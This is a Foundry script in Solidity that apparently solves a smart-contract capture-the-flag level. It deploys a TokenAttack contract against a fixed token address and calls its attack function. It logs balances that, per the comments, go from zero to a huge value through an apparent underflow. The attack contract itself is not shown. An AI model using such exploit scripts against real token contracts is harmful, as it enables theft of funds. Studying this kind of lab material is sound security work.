// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";
import {TokenAttack} from "../src/Token/TokenAttack.sol";

interface IToken {

    function totalSupply() external returns (uint256);

    function transfer(address _to, uint256 _value) external returns (bool);

    function balanceOf(address _owner) external view returns (uint256 balance);

}


contract TokenScript is Script{

    function run() public {
        IToken i_token = IToken(0x24e7b314FE3c09Ca6c1AD193c593Ed12e5Fa9311);

        vm.startBroadcast();

        TokenAttack tokenAttack = new TokenAttack(0x24e7b314FE3c09Ca6c1AD193c593Ed12e5Fa9311);

        console.log("Balance before: ", i_token.balanceOf(address(tokenAttack))); // 0

        tokenAttack.attack();

        console.log("Balance after: ", i_token.balanceOf(address(tokenAttack))); // max 256

        console.log("Balance: ", i_token.balanceOf(msg.sender));

        vm.stopBroadcast();
    }
    
}


